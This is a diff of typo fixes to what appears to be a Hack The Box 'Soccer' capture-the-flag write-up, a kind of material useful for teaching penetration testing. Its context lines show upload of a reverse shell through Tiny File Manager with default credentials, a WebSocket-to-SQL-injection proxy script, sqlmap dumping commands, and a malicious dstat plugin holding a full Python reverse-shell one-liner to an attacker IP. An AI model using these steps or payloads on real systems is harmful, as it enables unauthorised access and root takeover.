@@ -17,7 +17,7 @@ PORT     STATE    SERVICE
 
 ![](/Hack-The-Box/soccer/img/1.png)
 
-During directory scanning we found some endpoints where one is a login page to `tiny file mnager` and the second one is a upload page which is forbidden
+During directory scanning we found some endpoints where one is a login page to `tiny file manager` and the second one is a upload page which is forbidden
 ```shell
 200      GET      147l      526w     6917c http://soccer.htb/
 301      GET        7l       12w      178c http://soccer.htb/tiny => http://soccer.htb/tiny/
@@ -27,7 +27,7 @@ During directory scanning we found some endpoints where one is a login page to `
 
 So by using the defaults credentials from github page; we successfully login and found a upload function. so navigating to `/tiny/uploads` and uploaded our revshell payload and recived a shell as `www-data`
 
-SInce the site is running on `nginx` we just navigate to `/etc/nginx/site-availabes` and found a subdomain running on the server
+Since the site is running on `nginx` we just navigate to `/etc/nginx/site-availabes` and found a subdomain running on the server
 ![](/Hack-The-Box/soccer/img/3.png)
 
 ![](/Hack-The-Box/soccer/img/4.png)
@@ -50,7 +50,7 @@ Since there is nothing else that caught my eye I digged around and found out tha
 https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html
 ```
 
-so crafing the script 
+so crafting the script 
 ```python
 from http.server import SimpleHTTPRequestHandler
 from socketserver import TCPServer
@@ -112,7 +112,7 @@ try:
 except KeyboardInterrupt:
 	pass
 ```
-Now using sqlmap we have got password for user palyer
+Now using sqlmap we have got password for user player
 ```c
 sqlmap -u "http://localhost:8081/?id=96680*" --batch --dbs 
 sqlmap -u "http://localhost:8081/?id=96680*" --batch -D soccer_db --tables --dbs
@@ -136,7 +136,7 @@ player@soccer:/usr/local/etc$ cat doas.conf
 permit nopass player as root cmd /usr/bin/dstat
 ```
 
-Now we are abuding  dstat pligins in order to become root user
+Now we are abusing  dstat pligins in order to become root user
  create a file named `dstat_bq.py` with our rev_shell payload
 ```python
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.9",3636));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
@@ -148,6 +148,6 @@ check whether our malcious plugin have been loaded
 ` doas /usr/bin/dstat --list`
 ![](/Hack-The-Box/soccer/img/6.png)
 
-Open a netcat lisner and execute the following command
+Open a netcat listner and execute the following command
 `doas -u root /usr/bin/dstat --bq`
 ![](/Hack-The-Box/soccer/img/7.png)
